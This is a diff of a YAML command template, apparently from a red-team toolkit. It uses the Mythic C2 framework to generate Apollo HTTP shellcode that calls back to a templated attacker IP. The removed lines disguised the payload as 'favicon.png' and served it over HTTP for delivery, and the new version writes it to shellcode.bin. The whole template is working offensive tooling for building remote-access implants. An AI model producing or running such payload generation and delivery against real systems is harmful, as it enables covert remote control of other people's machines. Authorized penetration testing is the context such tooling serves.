@@ -1,16 +1,16 @@
 ---
 metadata:
-  filename: "deliver-windows-mythic-apollo-http-shellcode.yaml"
+  filename: "generate-mythic-apollo-http-shellcode.yaml"
   tags: ["windows", "c2"]
-  created: "2026-03-13"
-  authors: ["TIVKU"]
+  created: "2026-05-29"
+  authors: ["@s3mme", "@TIVKU"]
 
 content: |
-  mkdir -p packstation/outbound; \
-  printf '%s\n' '================================================================'; \
-  printf '%s\n' '              Mythic Apollo Shellcode Generator                '; \
-  printf '%s\n' '================================================================'; \
-  grep 'mythic_api_token' ~/.config/profi/config.yaml | awk '{print $2}' | tr -d '"' > /tmp/mythic_token_tmp; \
+  printf '%s\n' '================================================================' && \
+  printf '%s\n' '              Mythic Apollo Shellcode Generator                ' && \
+  printf '%s\n' '================================================================' && \
+  printf '%s\n' 'Mythic generates the shellcode. Please wait...' && \
+  grep 'mythic_api_token' ~/.config/profi/config.yaml | awk '{print $2}' | tr -d '"' > /tmp/mythic_token_tmp && \
   {{ python_path }} {{ templates_dir }}/helper_scripts/mythicConfigGenerator.py \
     --payload-type apollo \
     --callback-host http://{{ attacker_ip }} \
@@ -26,12 +26,10 @@ content: |
     --mythic-url {{ mythic_url }} \
     --api-token-file /tmp/mythic_token_tmp \
     --stdin \
-    --output packstation/outbound/favicon.png && \
+    --output packstation/outbound/shellcode.bin && \
+  rm -f /tmp/mythic_token_tmp && \
   printf '%s\n' '================================================================' && \
   printf '%s\n' '                   Apollo Shellcode Ready                       ' && \
-  printf '%s\n' 'File: packstation/outbound/favicon.png' && \
   printf '%s\n' 'Callback: http://{{ attacker_ip }}:{{ mythic_callback_port }}' && \
   printf '%s\n' 'Interval: {{ mythic_callback_interval }}s (jitter: {{ mythic_callback_jitter }}%)' && \
-  printf '%s\n' '================================================================'; \
-  rm -f /tmp/mythic_token_tmp; \
-  python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{ delivery_outbound_port }} -d packstation/outbound {{ delivery_dir_listing_flag }}
+  printf '%s\n' '================================================================'
